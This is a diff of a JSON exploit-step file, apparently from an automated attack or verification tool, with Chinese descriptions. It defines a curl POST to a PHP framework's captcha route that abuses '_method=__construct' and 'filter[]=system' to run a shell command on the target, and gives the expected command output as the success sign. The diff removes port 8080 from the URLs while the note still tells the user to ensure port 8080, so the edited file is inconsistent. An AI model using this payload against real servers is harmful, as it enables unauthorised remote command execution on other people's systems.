@@ -29,12 +29,12 @@
     {
       "step": 1,
       "description": "发送恶意POST请求执行命令",
-      "command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}:8080/index.php?s=captcha\"",
+      "command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}/index.php?s=captcha\"",
       "expected_result": "响应体中返回命令执行结果，例如 uid=33(www-data)。",
       "notes": "确保目标运行在默认端口8080，如果端口不同，需调整命令中的端口号。"
     }
   ],
-  "verification_command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}:8080/index.php?s=captcha\"",
+  "verification_command": "curl -d '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id' \"http://{TARGET}/index.php?s=captcha\"",
   "verification_success_sign": "响应体包含命令执行输出，如 uid=33(www-data)。",
   "requires_callback": false,
   "callback_note": "此漏洞不需要目标回连攻击机，可直接通过HTTP响应回显命令结果。",
